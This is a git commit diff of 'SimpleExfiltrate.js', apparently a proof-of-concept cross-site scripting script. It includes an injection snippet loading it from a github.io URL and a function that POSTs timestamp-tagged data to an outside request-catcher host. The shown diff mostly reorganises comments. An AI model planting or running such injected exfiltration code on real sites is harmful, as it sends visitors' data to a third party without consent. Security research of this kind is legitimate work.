040356ecafa9cc3b644799763d3cd3edeecf930f
JDL-84 <James.lynes@googlemail.com>
2020-08-29 14:45:48 +0100

    Update SimpleExfiltrate.js

--- SimpleExfiltrate.js
+++ SimpleExfiltrate.js
@@ -1,12 +1,24 @@
-//Authoer: JDL
-//<script src="https://jdl-84.github.io/CACHE-XSS/SimpleExfiltrate.js"></script> 
-var CurrDT          = new Date();
-var TimeAsMS        = CurrDT.getTime();
+/**
+ * Summary. Simple XSS Exfiltrate
+ *
+ * Description. Attempt to POST data to external site from external script
+ *
+ * @author JDL-84
+ * @link https://jdl-84.github.io/CACHE-XSS/SimpleExfiltrate.js
+ */
+
+//<script src='https://jdl-84.github.io/CACHE-XSS/SimpleExfiltrate.js'/>
+
+//Online POST Target
 var Toilet = "https://ptsv2.com/t/qo33d-1598654477";
 
+//Use Timestamp as identifier
+var CurrDT          = new Date();
+var TimeAsMS        = CurrDT.getTime();
+
+//Send Request to Toilet - Thirdparty POST catcher. 
 function ExfiltrateData(ID)
 {	
-	 //Send Request to Toilet - Thirdparty POST catcher. 
 	 const xhr = new XMLHttpRequest();
 	 xhr.open("POST", Toilet+"/post", true);
 	 xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
